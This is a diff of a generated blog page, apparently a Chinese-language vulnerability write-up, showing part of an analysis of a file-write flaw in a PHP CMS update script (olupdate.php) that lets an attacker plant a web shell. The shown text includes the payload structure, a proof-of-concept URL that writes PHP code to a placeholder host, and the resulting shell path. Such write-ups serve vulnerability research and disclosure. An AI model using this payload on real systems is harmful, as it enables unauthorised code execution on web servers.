@@ -451,7 +451,7 @@
 <p>此时由于sqlfile不是数组，即is_array($sqlfile)不成立，导致$string没有初始化，可以任意修改，接着调用file_put_contents将string的值写到/update/$addr/sqlist.php文件。</p>
 <p><em>PS:这里有一个小点,由于输入控制sqlfile不是数组，第345行执行$sqlfile[]=$bakfile = “../update/$addr/{$con_db_name}<em>{$date}</em>{$random}_{$num}.sql”;会导致给字符串赋值报错，导致无法执行到后面的Getshell部分。所以需要构造payload使得trim($sqldump)为空，即$sqldump值为空，从而跳过$sqlfile[]赋值部分，这里构造tableid=1000(其实只要&gt;=44即可)</em></p>
 <p>最后的payload结构如下：<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta-keyword">/admin/</span>system/olupdate.php?action=sql<span class="variable">&amp;sqlfile</span>=<span class="number">1</span><span class="variable">&amp;string</span>=shell内容<span class="variable">&amp;addr</span>=shell的目录<span class="variable">&amp;tableid</span>=<span class="number">1000</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="2-POC-参数addr为生成shell的目录，生成shell的文件名sqlist-php不可控"><a href="#2-POC-参数addr为生成shell的目录，生成shell的文件名sqlist-php不可控" class="headerlink" title="2.POC (参数addr为生成shell的目录，生成shell的文件名sqlist.php不可控)"></a>2.POC (参数addr为生成shell的目录，生成shell的文件名sqlist.php不可控)</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com/admin/system/olupdate.php?action=sql&amp;sqlfile=1&amp;string=<span class="php"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span>&amp;addr=12313&amp;tableid=1000</span><br></pre></td></tr></table></figure>
+<h3 id="2-POC-参数addr为生成shell的目录，生成shell的文件名sqlist-php不可控"><a href="#2-POC-参数addr为生成shell的目录，生成shell的文件名sqlist-php不可控" class="headerlink" title="2.POC (参数addr为生成shell的目录，生成shell的文件名sqlist.php不可控)"></a>2.POC (参数addr为生成shell的目录，生成shell的文件名sqlist.php不可控)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//xxx.com/admin/system/olupdate.php?action=sql&amp;sqlfile=1&amp;string=<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span>&amp;addr=12313&amp;tableid=1000</span></span><br></pre></td></tr></table></figure>
 <p>执行后的shell地址：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>xxx.com<span class="regexp">/admin/u</span>pdate<span class="regexp">/12313/</span>sqlist.php</span><br></pre></td></tr></table></figure></p>
 
       
@@ -605,7 +605,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">43</span>
+                <span class="site-state-item-count">44</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
